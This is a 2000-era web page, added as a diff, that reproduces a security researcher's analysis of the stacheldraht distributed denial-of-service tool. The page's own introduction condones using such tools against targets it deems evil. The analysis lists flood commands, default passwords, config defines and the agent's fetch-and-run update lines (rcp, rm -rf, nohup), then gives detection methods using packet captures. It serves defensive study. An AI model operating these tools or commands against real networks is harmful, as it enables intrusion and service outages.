@@ -1,0 +1,3499 @@
+<HTML>
+<HEAD>
+<TITLE>dod1.htm: denial of service attack tools</TITLE>
+<STYLE type="text/css">
+A:link { color: #02F }
+A:visited  { color: #808 }
+A:hover { color: purple; background: #AFB }
+</STYLE>
+</HEAD>
+<BODY BGCOLOR=#CCCCCC TEXT=#001010 VLINK=#405040>
+<A NAME="anchortop"></A>
+<!-- Begin Introdo -->
+<center>
+<a href="ideale.htm"><IMG SRC="images/antism.gif" ALT="No_commercial!" 
+ALIGN=BOTTOM WIDTH=114 HEIGHT=43 BORDER=0 VSPACE=0 HSPACE=0></a>
+<BR>
+<Font color=gray>Seekers against Smut</fonT>
+
+ <bR><br>
+<Font size=+4>
+denial of service attack swords</fonT><br>Updated: May 2000<hr width=44%><font size=+1>
+<font color=red>Warning</font>: "must read" introduction</fonT>
+<hr width=44%></center>This is a small collection 
+of "swords". There is no need for a 'disclaimer', since this is after all 
+just common 
+knowledge, which you can find (even without knowing how to search) all over the web. But these swords are quite sharp. 
+I count on your maturity, readers of this site.   
+Let's hope you have already learned enough to avoid using them for evil 
+purposes. 
+The following is provided in order to let you DEFEND all important 
+knowledge 
+<u>against</u> this kind of attacks, which are 
+- more often than one would think - performed by the commercial 
+bastards against all kind of knowledge sites that offer for free 
+what they would like to "sell" to the zombies.<bR>I really know  
+what I am saying: I found myself in the position of a stacheldraht "beta-tester" to use the words 
+of one of my attackers :-) In fact my old reverse engineering fortress  
+has been 'stacheldrahted' for many months since january 1999,  and was forced to close 
+, yet reopened short afterwards and 
+survived all attacks - until I decided to close 
+it myself in december 1999 - thank to my webmaster 
+Kevin's ability to defend it and rebuke the slaves of my enemies. This was 
+only possible finding (took a while: in those times there was not much info on this) and then 
+studying 
+the attack techniques used by rogue hackers on the web.<bR>So learn here the necessary how-tos, 
+but remain on our site, never use knowledge against knowledge spreading.<br>Please read - and try to understand - 
+what Forseti+ wrote to me about the possible dangers that the  
+material below hides:<br><br></center><i>
+Free
+access to information is 0 when it is buried under 1GB/sec of attack.
+Please be so be very careful to educate your readers why to use - if ever - these
+powerful tools against evil targets run by greed that offer nothing of
+substance and purposely attack our childs or is intended to rip people off, yet <u>even then</u> to pause, and think, why? 
+Please also do not
+encourage their use to blindly obscure access to systems just because they
+may do it. This is a sharp sword.
+</i><br><table align=right><tr><td>~S~ Forseti+</td></tr></table><center>
+<br><br>
+<font size=+1>
+<BR>Sharp swords on this very page: <hr width=33%>
+
+<font color=blue>[</font><a href="dod1.htm#stache">stacheldraht</a><font color=blue>]</font>
+ <font color=blue>[</font><a href="dod1.htm#tribeflood">Tribe Flood Network</a><font color=blue>]</font>
+  <font color=blue>[</font><a href="dod1.htm#trinoo">Trinoo</a><font color=blue>]</font><br>
+<BR>Sharp swords on other pages: <hr width=33%>
+
+<font color=blue>[</font><a href="dod2.htm">Source code to mstream (stream.c): dull base metal that can be beaten into a mighty sword</a><font color=blue>]</font>
+     </center></center></font>
+
+<a name="stache"></a><hr><pre>
+==========================================================================
+
+      The "stacheldraht" distributed denial of service attack tool
+
+==========================================================================
+
+David Dittrich <dittrich@cac.washington.edu>
+University of Washington
+Copyright 1999. All rights reserved.
+December 31, 1999
+
+
+Introduction
+------------
+
+The following is an analysis of "stacheldraht", a distributed denial
+of service attack tool, based on source code from the "Tribe Flood
+Network" distributed denial of service attack tool. [Note that
+throughout this analysis, actual nicks, site names, and IP addresses
+have been sanitized.]
+
+Stacheldraht (German for "barbed wire") combines features of the
+"trinoo" distributed denial of service tool, with those of the
+original TFN, and adds encryption of communication between the
+attacker and stacheldraht masters and automated update of
+the agents.
+
+For more information on trinoo and TFN, see:
+
+	http://staff.washington.edu/dittrich/misc/trinoo.analysis
+	http://staff.washington.edu/dittrich/misc/tfn.analysis
+
+In late June and early July of 1999, one or more groups were
+installing and testing trinoo networks and waging medium to large
+scale denial of service attacks employing networks of over 2000
+compromised systems.  These attacks involved, and were aimed at,
+systems around the globe.
+
+In late August/early September of 1999, focus began to shift from
+trinoo to TFN, presumed to be the original code by Mixter.  Then in
+late September/early October, a program that looked a lot like the TFN
+agent, known as "stacheldraht", began to show up on systems in Europe
+and the United States.
+
+These attacks prompted CERT to release Incident Note 99-04:
+
+	http://www.cert.org/incident_notes/IN-99-04.html
+
+Like trinoo, stacheldraht is made up of master (handler) and daemon,
+or "bcast" (agent) programs.  The handler/agent terminology was
+developed at the CERT Distributed System Intruder Tools workshop held
+in November 1999, and will be used in this analysis instead of the
+stacheldraht specific terms.  It is highly recommended that the
+CERT workshop report be read as well. See:
+
+	http://www.cert.org/reports/dsit_workshop.pdf
+
+There is some competition to stacheldraht in the form of Mixter's new
+version of TFN -- Tribe Flood Network 2000, or TFN2K -- released on
+December 21, 1999.  For more on TFN2K, See:
+
+	http://packetstorm.securify.com/distributed/
+	http://www.cert.org/advisories/CA-99-17-denial-of-service-tools.html
+
+Along with trinoo's handler/agent features, stacheldraht also shares
+TFN's features of distributed network denial of service by way of ICMP
+flood, SYN flood, UDP flood, and "Smurf" style attacks.  Unlike the
+original TFN and TFN2K, the analyzed stacheldraht code does not
+contain the "on demand" root shell bound to a TCP port (it may be
+based on earlier TFN code than was made public by Mixter in mid-1999).
+
+One of the weaknesses of TFN was that the attacker's connection to the
+master(s) that control the network was in clear-text form, and was
+subject to standard TCP attacks (session hijacking, RST sniping, etc.)
+Stacheldraht deals with this by adding an encrypting "telnet alike"
+(stacheldraht term) client.
+
+Stacheldraht agents were originally found in binary form on a number
+of Solaris 2.x systems, which were identified as having been
+compromised by exploitation of buffer overrun bugs in the RPC services
+"statd", "cmsd" and "ttdbserverd".  They have been witnessed "in the
+wild" as late as the writing of this analysis.
+
+After publishing analyses of trinoo and Tribe Flood Network on Bugtraq
+in December 1999, an incident investigator at another institution
+provided stacheldraht source code that was obtained from a file cache
+in a stolen account.  (I would like to thank this investigator, and
+also thank the folks at SecurityFocus for providing the open forum
+that allowed this to occur.)  This analysis was done using this
+captured source code (labelled version 1.1, with source file
+modification dates ranging from 8/15/1999 to 10/17/1999).
+
+The Makefiles contain rules for Linux and Solaris, with the default
+being Linux (even though it appears that the code does not work
+very reliably on Linux).  For the purposes of this analysis, all
+programs were compiled and run on Red Hat Linux 6.0 systems.  As far
+as I am aware, the agent has been witnessed "in the wild" only on
+Solaris 2.x systems.
+
+One thing that may not have been clearly stated in the analyses done
+on trinoo and Tribe Flood Network is that distributed denial of
+service attacks are two phase attacks, with "victims" and "attackers"
+that are defined depending on your point of view.
+
+There is an initial mass-intrusion phase, in which automated tools are
+used to remotely root compromise large numbers (i.e., in the several
+hundred to several thousand ranges) and the distributed denial of
+service agents are installed on these compromised systems.  These are
+primary victims (of system compromise.)  None of these distributed
+denial of service tools have any features that facilitate compromising
+systems, and these automated tools are held closely by those groups
+who wrote them.
+
+The mass-instrusion phase is followed by the actual denial of service
+attack phase, in which these compromised systems which constitute the
+handlers and agents of the distributed attack network are used to wage
+massive denial of service attacks against one or more sites.  These
+are secondary victims (of denial of service).
+
+[For an description of the methods used in the initial intrusion and
+network setup phases, see the analysis of the trinoo network,
+referenced in Appendix A.]
+
+Remember that modification of the source code can and would change any
+of the details of this analysis, such as prompts, passwords, commands,
+TCP/UDP port numbers, or supported attack methods, signatures, and
+features.
+
+
+The network: client(s)-->handler(s)-->agent(s)-->victim(s)
+------------------------------------------------------------
+
+The stacheldraht network is made up of one or more handler programs
+("mserv.c") and a large set of agents ("leaf/td.c").  The attacker uses
+an encrypting "telnet alike" program to connect to and communicate
+with the handlers ("telnetc/client.c").  A stacheldraht network would
+look like this:
+
+                   +--------+             +--------+
+                   | client |             | client |
+                   +--------+             +--------+
+                       |                      |
+        . . . --+------+---------------+------+----------------+-- . . .
+                |                      |                       |
+                |                      |                       |
+          +-----------+          +-----------+           +-----------+
+          |  handler  |          |  handler  |           |  handler  |
+          +-----------+          +-----------+           +-----------+
+                |                      |                       |
+                |                      |                       |
+. . . ---+------+-----+------------+---+--------+------------+-+-- . . .
+         |            |            |            |            |
+         |            |            |            |            |
+     +-------+    +-------+    +-------+    +-------+    +-------+
+     | agent |    | agent |    | agent |    | agent |    | agent |
+     +-------+    +-------+    +-------+    +-------+    +-------+
+
+
+The attacker(s) control one or more handlers using encrypting clients.
+Each handler can control many agents.  (There is an internal limit in
+the "mserv.c" code to 1000 agents. This is most likely to ensure the
+number of open file handles, commonly 1024, is not exceeded by the
+program.  Thanks to Adam C. Greenfield &lt;adam@mrniceguy.net> for pointing
+this out.  Besides, the code says that "1000 sockets are leet0.")  The
+agents are all instructed to coordinate a packet based attack against
+one or more victim systems by the handler (referred to as an "mserver"
+or "master server" in the code.)
+
+
+Communication
+-------------
+
+    Client to handler(s):	16660/tcp
+    Handler to/from agent(s):	65000/tcp, ICMP_ECHOREPLY
+
+Unlike trinoo, which uses UDP for communication between handlers and
+agents, or the original Tribe Flood Network, which uses ICMP for
+communication between the handler and agents, stacheldraht uses TCP
+and ICMP.
+
+Remote control of a stacheldraht network is accomplished using a
+simple client that uses symmetric key encryption for communication
+between itself and the handler.  The client accepts a single argument,
+the address of the handler to which it should connect.  It then
+connects using a TCP port (default 16660/tcp in the analyzed code).
+
+The attacker sees the following (if the proper password is given):
+
+---------------------------------------------------------------------------
+# ./client 192.168.0.1
+    [*] stacheldraht [*] 
+ (c) in 1999 by ...
+
+trying to connect...
+connection established.
+--------------------------------------
+enter the passphrase : sicken
+--------------------------------------
+entering interactive session.
+******************************
+   welcome to stacheldraht    
+******************************
+type .help if you are lame
+
+stacheldraht(status: a!1 d!0)>
+---------------------------------------------------------------------------
+
+The prompt shows the number of agents that are believed to be active
+("a!") and dead ("d!") at the time.  Using the command ".help" (let's
+assume, for the sake of argument, that we are lame) shows the
+supported command set:
+
+---------------------------------------------------------------------------
+stacheldraht(status: a!1 d!0)>.help
+available commands in this version are:
+--------------------------------------------------
+.mtimer   .mudp     .micmp .msyn    .msort  .mping
+.madd     .mlist    .msadd .msrem   .distro .help
+.setusize .setisize .mdie  .sprange .mstop  .killall
+.showdead .showalive
+--------------------------------------------------
+stacheldraht(status: a!1 d!0)>
+---------------------------------------------------------------------------
+
+
+Commands
+--------
+
+.distro	user server
+	Instructs the agent to install and run a new copy of itself
+	using the Berkeley "rcp" command, on the system "server",
+	using the account "user" (e.g., "rcp user@server:linux.bin ttymon")
+
+.help
+	Prints a list of supported commands.
+
+.killall
+	Kills all active agents.
+
+.madd ip1[:ip2[:ipN]]
+	Add IP addresses to list of attack victims.
+
+.mdie
+	Sends die request to all agents.
+
+.mdos
+	Begins DoS attack.
+
+.micmp ip1[:ip2[:ipN]]
+	Begin ICMP flood attack against specified hosts.
+
+.mlist
+	List IP addresses of hosts being DoS attacked at the moment.
+
+.mping
+	Pings all agents (bcasts) to see if they are alive.
+
+.msadd
+	Adds a new master server (handler) to the list of available
+	servers.
+
+.msort
+	Sort out dead/alive agents (bcasts). (Sends pings and
+	shows counts/percentage of dead/alive agents).
+
+.mstop ip1[:ip2[:ipN]]
+.mstop all
+	Stop attacking specific IP addresses, or all.
+
+.msrem
+	Removes a master server (handler) from the list of available
+	servers.
+
+.msyn ip1[:ip2[:ipN]]
+	Begin SYN flood attack against specified hosts.
+
+.mtimer seconds
+	Set timer for attack duration. (No checks on this value.)
+
+.mudp ip1[:ip2[:ipN]]
+	Begin UDP flood attack against specified hosts.
+	(Trinoo DoS emulation mode.)
+
+.setisize
+	Sets size of ICMP packets for flooding. (max:1024,
+	default:1024).
+
+.setusize
+	Sets size of UDP packets for flooding (max:1024,
+	default:1024).
+
+.showalive
+	Shows all "alive" agents (bcasts).
+
+.showdead
+	Shows all "dead" agents (bcasts).
+
+.sprange lowport-highport
+	Sets the range of ports for SYN flooding (defaults to
+	lowport:0, highport:140).
+
+
+Password protection
+-------------------
+
+After connecting to the handler using the client program, the attacker
+is prompted for a password.  This password (default "sicken" in the
+analyzed code) is a standard crypt() encrypted password, which is then
+Blowfish encrypted using the passphrase "authentication" before being
+sent over the network to the handler (*all* communication between
+the agent and handler is Blowfish encrypted with this passphrase.)
+
+Like TFN, C macros ("config.h") define values used for expressing
+commands, replacement argument vectors ("HIDEME" and "HIDEKIDS")
+to conceal program names, etc.:
+
+---------------------------------------------------------------------------
+#ifndef _CONFIG_H
+
+/* user defined values for the teletubby flood network */
+
+#define HIDEME "(kswapd)"
+#define HIDEKIDS "httpd"
+#define CHILDS 10
+
+/* These are like passwords, you might want to change them */
+
+#define ID_SHELL   1	/* to bind a rootshell */
+
+#define ID_ADDR  699     /* ip add request for the flood server */
+
+#define  ID_SETPRANGE 2007 /* set port range for synflood */
+#define   ID_SETUSIZE 2006 /* set udp size */
+#define   ID_SETISIZE 2005 /* set icmp size */
+#define    ID_TIMESET 2004 /* set the flood time */
+#define     ID_DIEREQ 2003 /* shutdown request of the masterserver */
+#define   ID_DISTROIT 2002 /* distro request of the master server */
+#define ID_REMMSERVER 2001 /* remove added masterserver */
+#define ID_ADDMSERVER 2000 /* add new masterserver request */
+#define SPOOF_REPLY 1000   /* spoof test reply of the master server
+#define ID_TEST  668       /* test of the master server */
+#define ID_ICMP  1055  	   /* to icmp flood */
+#define ID_SENDUDP 2	   /* to udp flood */
+#define ID_SENDSYN 3	   /* to syn flood */
+#define ID_SYNPORT 4	   /* to set port */
+#define ID_STOPIT  5	   /* to stop flooding */
+#define ID_SWITCH  6	   /* to switch spoofing mode */
+#define ID_ACK     7	   /* for replies to the client */
+
+#define _CONFIG_H
+#endif
+---------------------------------------------------------------------------
+
+As you can see, it is recommended that these be changed to prevent
+someone stumbling across the agents from knowing what values are
+used, thereby allowing them to execute agent commands.
+
+
+Fingerprints
+------------
+
+As with trinoo and Tribe Flood Network, the methods used to install
+the handler/agent will be the same as installing any program on a
+compromised Unix system, with all the standard options for concealing
+the programs and files (e.g., use of hidden directories, "root kits",
+kernel modules, etc.)
+
+One feature of stacheldraht not shared by trinoo or TFN is the ability
+to upgrade the agents on demand.  This feature employs the Berkeley
+"rcp" command (514/tcp), using a stolen account at some site as a
+cache.  On demand, all agents are instructed to delete the current
+program image, go out and get a new copy (either Linux- or
+Solaris-specific binary) from a site/account using "rcp", start running
+this new image with "nohup", and then exit.
+
+As for identifying the programs in the file system, there are
+(provided they are not edited out) some discernible strings.
+
+Strings embedded in the encrypting client ("client") include the
+following:
+
+------------------------------------------------------------------------------
+ . . .
+connection closed.
+usage: ./sclient &lt;ip/host>
+    [*] stacheldraht [*] 
+ (c) in 1999 by ...
+trying to connect...
+unable to resolv %s
+unable to connect.
+connection established.
+--------------------------------------
+enter the passphrase : 
+authentication
+failed
+authentication failed.
+entering interactive session.
+./0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+huhu
+ . . .
+------------------------------------------------------------------------------
+
+Strings embedded in the handler ("mserv") include the following:
+
+------------------------------------------------------------------------------
+ . . .
+%d.%d.%d.%d
+jbQ4yQaKLbFZc
+* mtimer reached *
+.quit
+exiting...
+you need to stop the packet action first.
+.help
+.version
+[*]stacheldraht[*] mserver version: 1.1
+setusize
+setisize
+mdos
+mping
+mudp
+micmp
+msyn
+mstop
+mtimer
+madd
+mlist
+msort
+msadd
+msrem
+distro
+sprange
+killall
+showdead
+showalive
+add some bcasts mofo.
+killing all active childs...
+usage: .sprange &lt;lowport-highport>
+example: .sprange 0-140
+ low port is : %i
+high port is : %i
+request was sent to the network.
+usage: .setusize &lt;udp packet size (&lt;=1024)>
+current udp packet size is %ibytes
+udp packet size was set to %i bytes.
+udp packet size is too large.
+usage: .setisize &lt;icmp packet size (&lt;=1024)>
+current icmp packet size is %ibytes
+icmp packet size was set to %i bytes.
+icmp packet size is too large.
+sending mass die request...
+finished.
+.mudp
+starting trinoo emulation...
+removing useful commands.
+- DONE - 
+available commands in this version are:
+--------------------------------------------------
+.mtimer   .mudp     .micmp .msyn    .msort  .mping
+.madd     .mlist    .msadd .msrem   .distro .help
+.setusize .setisize .mdie  .sprange .mstop  .killall
+.showdead .showalive
+usage: .distro &lt;user> &lt;server that runs rcp>
+remember  : the distro files need to be executable!
+that means: chmod +x linux.bin , chmod +x sol.bin ;))
+sending distro request to all bcasts....
+      user : %s
+rcp server : 
+unable to resolve - %s
+unable to send distro request.
+request was sent, wait some minutes ;) 
+usage: .msrem &lt;masterserver>
+removing masterserver - 
+failed.
+usage: .msadd &lt;masterserver>
+adding masterserver - 
+no packet action at the moment, sir.
+the followings ip(s) are getting packeted...
+--------------------------------------------
+[*] stacheldraht [*] is packeting %d ips
+[*] stacheldraht [*] is packeting 1 ip
+.mstop all
+deleting from packetlist...
+%s - removed.
+%s - skipped.
+restarting packeting routines...
+niggahbitch
+usage: .madd &lt;ip1:ip2:ip3:ip4>
+adding to packetlist...
+%s - added.
+usage: .mtimer &lt;seconds to packet>
+packet timer was set to %d seconds
+usage: .mstop &lt;all> or &lt;ip1:ip2:ip3:ip4:ip5 etc..>
+packeting stopped.
+usage: .msyn &lt;ip1:ip2:ip3:ip4:ip5 etc..>
+the net is already packeting.
+mass syn flooding
+%i floodrequests were sent to %i bcasts.
+usage: .micmp &lt;ip1:ip2:ip3:ip4:ip5 etc..>
+mass icmp bombing
+usage: .mudp &lt;ip1:ip2:ip3:ip4:ip5 etc..>
+mass udp bombing
+tR1n00(status: a!%i d!%i)>
+stacheldraht(status: a!%i d!%i)>
+waiting for ping replies...
+total bcasts : %d   - 100%
+alive bcasts : 0   - 0%
+alive bcasts : %d   -  %d%
+dead bcasts  : %d   - %d%
+showing the alive bcasts...
+---------------------------
+alive bcasts: %i
+showing the dead bcasts...
+--------------------------
+dead bcasts: %i
+sorting out all the dead bcasts
+-------------------------------
+%d dead bcasts were sorted out.
+bcasts
+[*]-stacheldraht-[*] - forking in the background...
+%i bcasts were successfully read in.
+3.3.3.3
+spoofworks
+ficken
+authentication
+failed
+******************************
+   welcome to stacheldraht    
+type .help if you are lame
+./0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+huhu
+[0;35mTribe Flood Network (c) 1999 by 
+[5mMixter
+ . . .
+------------------------------------------------------------------------------
+
+Strings embedded in the agent ("td") include the following:
+
+------------------------------------------------------------------------------
+ . . . 
+%d.%d.%d.%d
+ICMP
+Error sending syn packet.
+tc: unknown host
+3.3.3.3
+mservers
+randomsucks
+skillz
+ttymon
+rm -rf %s
+rcp %s@%s:linux.bin %s
+nohup ./%s
+1.1.1.1
+127.0.0.1
+lpsched
+no masterserver config found.
+using default ones.
+available servers: %i - working servers : 0
+[*] stacheldraht [*] installation failed.
+found a working [*] stacheldraht [*] masterserver.
+masterserver is gone, looking for a new one
+sicken
+in.telne
+./0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+ . . .
+------------------------------------------------------------------------------
+
+When each agent starts up, it attempts to read a master server
+configuration file to learn which handler(s) may control it.  This
+file is a list of IP addresses, encrypted using Blowfish, with
+a passphrase of "randomsucks". Failing to find a configuration file,
+there are one or more default handler IP addresses compiled into the
+program (shown above as "1.1.1.1" and "127.0.0.1" - these will
+obviously be changed).
+
+Once the agent has determined a list of potential handlers, it then
+starts at the beginning of the list of handlers and sends an
+ICMP_ECHOREPLY packet with an ID field containing the value 666 and data
+field containing the string "skillz".  If the master gets this packet,
+it sends back an ICMP_ECHOREPLY packet with an ID field containing the
+value 667 and data field containing the string "ficken".  (It should
+be noted that there appears to be a bug that makes the handler and
+agent send out some large, e.g., >1000 byte, packets.  The handler and
+agent continue periodically sending these 666|skillz / 667|ficken
+packets back and forth.  This would be one way of detecting agents/masters
+by passively monitoring these ICMP packets.)
+
+Seen with "sniffit" (modified per patches in the TFN analysis),
+these packets look like this:
+
+------------------------------------------------------------------------------
+ICMP message id: 10.0.0.1 > 192.168.0.1
+  ICMP type: Echo reply
+ 45 E 00 . 04 . 14 . 01 . 0F . 00 . 00 . 40 @ 01 . E9 . 53 S 0A . 00 . 00 . 01 .
+ C0 . A6 . 00 . 01 . 00 . 00 . B4 . 13 . 02 . 9A . 00 . 00 . 00 . 00 . 00 . 00 .
+ 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ 73 s 6B k 69 i 6C l 6C l 7A z 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ . . . [60 lines of zeros deleted]
+ 00 . 00 . 00 . 00 .
+
+ICMP message id: 192.168.0.1 > 10.0.0.1
+  ICMP type: Echo reply
+ 45 E 00 . 04 . 14 . 04 . F8 . 00 . 00 . 40 @ 01 . E5 . 6A j C0 . A6 . 00 . 01 .
+ 0A . 00 . 00 . 01 . 00 . 00 . CE . 21 ! 02 . 9B . 00 . 00 . 00 . 00 . 00 . 00 .
+ 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ 66 f 69 i 63 c 6B k 65 e 6E n 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
+ . . . [60 lines of zeros deleted]
+ 00 . 00 . 00 . 00 .
+------------------------------------------------------------------------------
+
+Seen with "ngrep", it would look like this:
+
+------------------------------------------------------------------------------
+# ngrep -x "*" icmp
+interface: eth0 (0.0.0.0/0.0.0.0)
+filter: ip and ( icmp )
+Kernel filter, protocol ALL, raw packet socket
+match: *
+#
+I 10.0.0.1 -> 192.168.0.1 0:0
+  02 9a 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    73 6b 69 6c 6c 7a 00 00    ........skillz..
+[ 61 lines of zeroes deleted ]
+  00 00 00 00 00 00 00 00    00 00 00 00                ............    
+#
+I 192.168.0.1 -> 10.0.0.1 0:0
+  02 9b 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    66 69 63 6b 65 6e 00 00    ........ficken..
+[ 61 lines of zeroes deleted ]
+  00 00 00 00 00 00 00 00    00 00 00 00                ............    
+#
+------------------------------------------------------------------------------
+
+While "ngrep" is easier to use and more concise in its output than
+"tcpdump" / "tcpshow", it does not run on as many systems, e.g.,
+Digital Unix 4.x, in the current version (1.35 at the time of writing
+this document).
+
+In addition to finding an active handler, the agent performs a test
+to see if the network on which the agent is running allows packets to
+exit with forged source addresses.  It does this by sending out an
+ICMP ECHO packet with a forged IP address of "3.3.3.3", an ID of
+666, and the IP address of the agent system (obtained by getting the
+hostname, then resolving this to an IP address) in the data field of
+the ICMP packet.  (Note that it also sets the Type of Service field to
+7 on this particular packet, while others have a ToS value of 0.)
+
+If the master receives this packet, it replies to the IP address
+embedded in the packet with an ICMP_ECHOREPLY packet containing an ID
+of 1000 and the word "spoofworks" in the data field.  If the agent
+receives this packet, it sets a spoof_level of 0 (can spoof all 32
+bits of IP address).  If it times out before receiving a spoof reply
+packet, it sets a spoof_level of 3 (can only spoof the final octet).
+
+These packets (as seen by "tcpdump" and "ngrep") are shown here:
+
+------------------------------------------------------------------------------
+# tcpdump icmp
+ . . .
+14:15:35.151061 3.3.3.3 > 192.168.0.1: icmp: echo request [tos 0x7]
+14:15:35.177216 192.168.0.1 > 10.0.0.1: icmp: echo reply
+ . . .
+
+# ngrep -x "*" icmp
+interface: eth0 (0.0.0.0/0.0.0.0)
+filter: ip and ( icmp )
+Kernel filter, protocol ALL, raw packet socket
+match: *
+#
+I 3.3.3.3 -> 192.168.0.1 8:0
+  00 00 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    31 30 2e 30 2e 30 2e 31    ........10.0.0.1
+  00 00 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00                               ........        
+#
+I 192.168.0.1 -> 10.0.0.1 0:0
+  03 e8 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    73 70 6f 6f 66 77 6f 72    ........spoofwor
+  6b 73 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ks..............
+[ 60 lines of zeroes deleted ]
+  00 00 00 00 00 00 00 00    00 00 00 00                ............    
+#
+------------------------------------------------------------------------------
+
+There is also a code in the agent to perform an ID test, sending an
+ICMP_ECHOREPLY packet with an ID field value of 669, and the string
+"sicken\n" in the data field.  This code is triggered if the agent
+is sent an ICMP_ECHOREPLY packet with an ID field containing the value
+668.  The program "gag" (see Appendix A) will allow you to probe for
+stacheldraht agents, which will show up with "ngrep" like this:
+
+------------------------------------------------------------------------------
+# ngrep -x "*" icmp
+interface: eth0 (0.0.0.0/0.0.0.0)
+filter: ip and ( icmp )
+Kernel filter, protocol ALL, raw packet socket
+match: *
+#
+I 10.0.0.2 -> 198.162.0.1 0:0
+  02 9c 00 00 67 65 73 75    6e 64 68 65 69 74 21       ....gesundheit! 
+#
+I 198.162.0.1 -> 10.0.0.2 0:0
+  02 9d 00 00 00 00 00 00    00 00 00 00 00 00 00 00    ................
+  00 00 00 00 00 00 00 00    73 69 63 6b 65 6e 0a 00    ........sicken..
+[ 61 lines of zeroes deleted ]
+  00 00 00 00 00 00 00 00    00 00 00 00                ............    
+------------------------------------------------------------------------------
+
+The script "gag" would be used like this.  First, build a list of all
+suspect systems (e.g., do an "nmap" OS detection scan and find all
+Solaris and Linux systems on your network, or just scan the entire
+network and find all active IP addresses).  Start "tcpdump" to capture
+all the potential replies for later use.  Then start "gag", passing it
+this list of IP addresses to check.
+
+------------------------------------------------------------------------------
+# tcpdump -s 1500 -w stach.dump 'icmp[4:2] = 669'
+# ./gag -v iplist
+sending packet [668/"gesundheit!"] to 192.168.0.1
+sending packet [668/"gesundheit!"] to 192.168.0.30
+sending packet [668/"gesundheit!"] to 192.168.1.2
+sending packet [668/"gesundheit!"] to 192.168.1.5
+sending packet [668/"gesundheit!"] to 192.168.2.10
+sending packet [668/"gesundheit!"] to 192.168.3.6
+ . . .
+------------------------------------------------------------------------------
+
+To see the list of systems that returned ICMP_ECHOREPLY packets with
+ID 669, do the following:
+
+------------------------------------------------------------------------------
+# tcpdump -r stach.dump
+tcpdump: Filtering in user process
+15:27:57.520094 192.168.0.1 > 10.0.0.1: icmp: echo reply (DF)
+15:28:01.984660 192.168.2.10 > 10.0.0.1: icmp: echo reply (DF)
+------------------------------------------------------------------------------
+
+To actually see the packet contents to confirm "sicken\n" is included,
+you can do the following:
+
+------------------------------------------------------------------------------
+# tcpshow &lt; stach.dump | egrep "Source IP|sicken"
+tcpdump: Filtering in user process
+        Source IP Address:              198.162.0.1
+        ....................sicken
+        Source IP Address:              192.168.2.10
+        ....................sicken
+------------------------------------------------------------------------------
+
+[There are more elegant ways of doing this, like writing a robust and
+feature filled C program with libnet (see Appendix B for reference),
+but there wasn't enough time before Y2K eve to get elegant.  What the
+heck.  Dirty works fine for me. I found three agents when I ran it
+"live."]
+
+[January 2000 - the program described above was finally written, which
+detects stacheldraht, as well as trinoo and TFN programs.  It can be
+found at: http://staff.washington.edu/dittrich/misc/ddos_scan.tar]
+
+The strings "skillz", "spoofworks", "sicken\n", "niggahbitch", and
+"ficken" -- all sent in ICMP data segments -- are not encrypted, so
+are visible in the data portion of ICMP_ECHOREPLY packets.  The ID
+values 666, 667, 668, 669, and 1000 would also be easily identifiable
+in the packet flow using "ngrep", or the other methods above.
+
+The stacheldraht handler, which forks to handle commands and listen
+for ICMP packets, is seen on the system with "lsof" like this:
+
+------------------------------------------------------------------------------
+# lsof -c mserv
+COMMAND  PID USER   FD   TYPE DEVICE    SIZE  NODE NAME
+mserv   1072 root  cwd    DIR    3,3    2048 40961 /tmp/...
+mserv   1072 root  rtd    DIR    3,3    1024     2 /
+mserv   1072 root  txt    REG    3,3   50506 41421 /tmp/.../mserv
+mserv   1072 root  mem    REG    3,3  342206 30722 /lib/ld-2.1.1.so
+mserv   1072 root  mem    REG    3,3   63878 30731 /lib/libcrypt-2.1.1.so
+mserv   1072 root  mem    REG    3,3 4016683 30729 /lib/libc-2.1.1.so
+mserv   1072 root    0u   CHR  136,4             6 /dev/pts/4
+mserv   1072 root    1u   CHR  136,4             6 /dev/pts/4
+mserv   1072 root    2u   CHR  136,4             6 /dev/pts/4
+mserv   1072 root    3u  sock    0,0          2143 can't identify protocol
+mserv   1073 root  cwd    DIR    3,3    2048 40961 /tmp/...
+mserv   1073 root  rtd    DIR    3,3    1024     2 /
+mserv   1073 root  txt    REG    3,3   50506 41421 /tmp/.../mserv
+mserv   1073 root  mem    REG    3,3  342206 30722 /lib/ld-2.1.1.so
+mserv   1073 root  mem    REG    3,3   63878 30731 /lib/libcrypt-2.1.1.so
+mserv   1073 root  mem    REG    3,3 4016683 30729 /lib/libc-2.1.1.so
+mserv   1073 root    0u   CHR  136,4             6 /dev/pts/4
+mserv   1073 root    1u   CHR  136,4             6 /dev/pts/4
+mserv   1073 root    2u   CHR  136,4             6 /dev/pts/4
+mserv   1073 root    3u  inet   2144           TCP *:16660 (LISTEN)
+mserv   1088 root  cwd    DIR    3,3    2048 40961 /tmp/...
+mserv   1088 root  rtd    DIR    3,3    1024     2 /
+mserv   1088 root  txt    REG    3,3   50506 41421 /tmp/.../mserv
+mserv   1088 root  mem    REG    3,3  342206 30722 /lib/ld-2.1.1.so
+mserv   1088 root  mem    REG    3,3   63878 30731 /lib/libcrypt-2.1.1.so
